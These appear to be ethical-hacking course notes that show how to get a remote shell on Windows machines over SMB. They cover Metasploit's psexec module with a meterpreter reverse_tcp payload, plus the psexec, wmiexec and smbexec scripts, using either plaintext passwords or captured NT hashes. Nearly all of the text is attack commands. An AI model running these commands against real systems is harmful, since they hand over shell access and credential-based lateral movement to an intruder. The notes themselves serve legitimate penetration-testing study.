---
tags:
  - PEH
---
## Gaining [[Shell access and its types|shell access]] using [[Metasploit - ميتاسبلويت|MS]]
### Using password
```bash
# We want to look for exploit/windows/smb/psexec and use it
msf > search psexec
msf > use <number-of-exploit/windows/smb/psexec>

# Now we want to change the payload to a windows/x64 one
msf > set payload windows/x64/meterpreter/reverse_tcp

# Set the RHOST, SMBDomain=MARVEL, SMBUser, SMBPass
msf > set <mentioned-above> <value>

# Exploit!
msf > run
```
### Using SAM hashes

>[!NOTE] Format
>The format of the hash in the SAM file is (LM:NT).

To utilize SAM hashes captured from the [[SMB Relay Attacks|SMB Relay attacks]]:
```bash
# We want to look for exploit/windows/smb/psexec and use it
msf > search psexec
msf > use <number-of-exploit/windows/smb/psexec>

# Now we want to change the payload to a windows/x64 one
msf > set payload windows/x64/meterpreter/reverse_tcp

# Set SMBUser to administrator
msf > set SMBUser administrator

# Make sure to unset the SMBDomain
msf > unset SMBDomain

# Set SMBPass to the hash
msf > set SMBPass <admin-hash>

# Exploit!
msf > run
```
## Gaining shell access using ps/wmi/smbexec.py
### Using password
```bash
# Two ways to execute it
ps/wmi/smbexec.py <domain-name>/<username>:"<password>"@<ip-address>
ps/wmi/smbexec.py <domain-name>/<username>:@<ip-address>
```
### Using SAM hash
```bash
ps/wmi/smbexec.py administrator@<ip-address> -hashes <admin-hash>
```